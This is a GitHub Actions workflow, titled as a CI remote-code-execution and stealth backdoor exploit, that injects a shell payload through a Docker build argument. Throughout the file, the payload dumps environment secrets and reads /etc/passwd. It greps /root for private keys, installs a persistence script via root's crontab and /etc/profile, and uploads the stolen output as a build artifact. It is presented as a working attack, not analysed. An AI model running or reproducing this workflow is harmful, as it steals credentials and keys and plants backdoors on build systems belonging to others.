name: Critical CI RCE & Stealth Backdoor
on: [push]

jobs:
  rce_exploit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Malicious Dockerfile
        run: |
          mkdir -p ./taskcluster/docker/python
          cat <<EOF > ./taskcluster/docker/python/Dockerfile
          FROM python:3.11-alpine
          ARG PYTHON_VERSION
          RUN echo "[INFO] Payload executing..." && sh -c "\${PYTHON_VERSION}" || true
          EOF

      - name: Launch Payload
        run: |
          PAYLOAD=$(cat <<'EOF'
          echo "[!] Dumping internal secrets..."
          printenv > /leaked.txt

          echo "[!] Installing runtime backdoor..."
          echo '#!/bin/sh' > /usr/local/bin/init.sh
          echo 'printenv >> /runtime.log' >> /usr/local/bin/init.sh
          echo 'cat /etc/passwd >> /runtime.log' >> /usr/local/bin/init.sh
          chmod +x /usr/local/bin/init.sh
          echo '@reboot /usr/local/bin/init.sh' >> /etc/crontabs/root
          echo '/usr/local/bin/init.sh' >> /etc/profile

          echo "[!] Attempting SSH private key scan..."
          grep -r "PRIVATE KEY" /root > /keys_dump.txt || true
          EOF
          )

          docker build \
            --build-arg PYTHON_VERSION="$PAYLOAD" \
            -t critical_pwn ./taskcluster/docker/python

          docker run --rm critical_pwn sh -c "cat /leaked.txt && cat /keys_dump.txt || true" > output.txt

      - name: Upload Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: leak-artifacts
          path: output.txt
